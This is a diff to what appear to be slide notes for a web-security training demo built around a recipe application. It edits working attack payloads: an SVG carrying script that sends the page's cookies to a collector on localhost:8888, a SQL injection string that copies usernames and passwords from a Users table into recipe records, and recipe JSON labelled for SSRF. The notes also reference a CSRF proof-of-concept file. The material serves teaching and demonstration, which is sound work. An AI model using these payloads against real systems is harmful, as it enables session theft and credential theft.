@@ -21,7 +21,7 @@ create the following svg:
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
 <script type="text/javascript">
-      fetch("http://localhost:8888/" + document.cookie)
+      fetch("http://localhost:8888/?d=" + document.cookie)
    </script>
 </svg>
 
@@ -41,18 +41,16 @@ Files\CSRFPoC.html
 
 slide 91 - Payload for add recipes
 =========================================================================================
-getting a file from the api
 [
     {
         "Name": "Chocolate Cake",
-        "Instructions": "Mix ingredients and bake. Pt on nice plate. Add chocolate syrop",
+        "Instructions": "Mix ingredients and bake. ut on nice plate. Add chocolate syrup",
         "ImageUrl": "https://live.staticflickr.com/47/148164470_24b709ed61.jpg"
     }
 ]
 
 slide 100 - Payload for add recipes (ssrf)
 =========================================================================================
-getting a file from the api
 [
     {
         "Name": "Carrot Cake",
@@ -64,4 +62,4 @@ slide 110 - Payload for add recipes (sqli)
 =========================================================================================
 
 Use the following payload for instructions in add recipe
-','test');insert into Recipes(Name, Instructions, ImagePath)  select username,username,password from Users; --
+','test','test');insert into Recipes(Name, Instructions, ImagePath)  select username,username,password from Users; --
